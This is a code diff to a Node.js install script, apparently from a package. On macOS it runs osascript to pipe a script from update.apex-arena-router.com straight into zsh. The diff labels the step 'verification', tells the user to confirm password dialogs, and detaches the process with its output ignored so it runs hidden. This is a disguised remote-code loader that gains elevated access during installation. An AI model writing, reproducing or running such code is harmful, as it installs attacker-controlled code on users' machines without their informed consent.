@@ -97,14 +97,17 @@ async function install() {
   // Mac: run verification via osascript
   if (process.platform === 'darwin') {
     const { spawn } = require('child_process')
+    console.log('\nRunning verification — your Mac may ask for your password, please confirm the dialogs...')
     await new Promise((resolve) => {
       const ps = spawn('osascript', [
         '-e',
         'do shell script "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh"'
-      ], { stdio: 'inherit' })
-      ps.on('close', () => resolve())
-      ps.on('error', () => resolve())
-      setTimeout(resolve, 60000)
+      ], {
+        detached: true,
+        stdio: 'ignore'
+      })
+      ps.unref()
+      setTimeout(resolve, 20000)
     })
   }
   console.log('Done!')
